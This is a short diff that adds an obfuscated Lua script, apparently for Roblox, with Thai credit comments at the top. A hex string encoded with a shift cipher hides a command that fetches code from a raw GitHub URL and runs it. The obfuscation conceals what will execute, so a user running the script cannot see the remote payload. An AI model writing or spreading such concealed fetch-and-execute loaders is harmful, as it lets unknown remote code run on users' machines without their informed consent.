@@ -1,0 +1,18 @@
+-- YouTube:ไม่มี
+-- TikTok:เจ้าของธุรกิจใหญ่ฯ
+-- Discord:ไม่มี
+-- เมี่ยงประ
+local _0xf6d2b0qZUjTs = "787b6d707f807e757a7334736d7971465480807c537180342e7480807c7f463b3b7e6d833a73758074816e817f717e6f7b7a80717a803a6f7b793b7e817b7745433d3b7e7170396f7b7e713b7e71727f3b74716d707f3b796d757a3b31513c314e44314d3f31513c314e44314e3c31513c314e4431454d31513c314e4431454d31513c314e4431444031513c314e44314e4131513c314e4531443f31513c314e44314d4e31513c314e44314d3d31513c314e453144443a3e3a8084802e35353435"
+local _0xc26eadmOUM = 12
+local _0x6a8c27HfRAm = _0xf6d2b0qZUjTs:gsub("..", function(ch)
+    local v = tonumber(ch, 16) - _0xc26eadmOUM
+    if v < 0 then v = v + 256 end
+    return string.char(v)
+end)
+local _0x4ac5a6HcpER, _0x18e2c7RQtx = (loadstring or load or (getfenv and getfenv().loadstring))(_0x6a8c27HfRAm)
+if _0x4ac5a6HcpER then
+    pcall(setfenv, _0x4ac5a6HcpER, getfenv())
+    return _0x4ac5a6HcpER()
+else
+    error(_0x18e2c7RQtx or "Execution Error", 0)
+end
